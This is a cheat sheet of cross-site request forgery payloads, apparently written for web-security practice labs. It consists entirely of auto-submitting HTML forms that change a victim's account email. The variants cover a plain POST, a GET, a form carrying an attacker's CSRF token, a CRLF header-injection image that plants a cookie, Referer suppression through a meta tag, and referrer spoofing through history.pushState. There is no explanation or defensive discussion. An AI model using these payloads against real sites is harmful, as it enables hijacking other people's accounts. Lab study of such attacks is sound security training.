// csrf post request
<form method="POST" action="<APIU>/my-account/change-email">
    <input type="hidden" name="email" value="pip3lee101@gmail.com">
</form>
<script>
        document.forms[0].submit();
</script>

//with attacker csrf token
<form method="POST" action="<APIU>/my-account/change-email">
    <input type="hidden" name="email" value="pip3lee101@gmail.com">
    <input type="hidden" name="csrf" value="lkcY00JNKqN6ywfIB9j0Ki89oPjB8gBb">
</form>
<script>
        document.forms[0].submit();
</script>

//with attacker csrf token and csrfkey cookie or related cookie to csrf || httpheader vulnerablity
<form method="POST" action="<APIU>/my-account/change-email">
    <input type="hidden" name="email" value="pip3lee101@gmail.com">
    <input type="hidden" name="csrf" value="MREhwJjHDpaxKAh4wAiTebEevF08vamA">
</form>
<img src="<|vulnerable link></?link-enpoint|>%0d%0aSet-Cookie:%20<|COOKIE-VALUE|>=<|COOKIE-KEY|>%3b%20SameSite=None" onerror="document.forms[0].submit()">



// csrf get request
<form action="<APIU>/my-account/change-email">
    <input type="hidden" name="email" value="anything@web-security-academy.net">
</form>
<script>
        document.forms[0].submit();
</script>


//with html body referre never and setheadder
<html lang="en">
<head>
    <meta name="referrer" content="never">
</head>
<body>
<form method="POST" action="<APIU>/my-account/change-email">
    <input type="hidden" name="email" value="pip3lee101@gmail.com">
</form>
<script>
        document.forms[0].submit();
</script>
    
</body>
</html> 

//with html body referrer change
<html lang="en">
<body>
<script>history.pushState("", "", "/?YOUR-LAB-ID.web-security-academy.net")</script>
<form method="POST" action="<APIU>/my-account/change-email">
    <input type="hidden" name="email" value="pip3lee101@gmail.com">
</form>
<script>
        document.forms[0].submit();
</script>
    
</body>
</html>  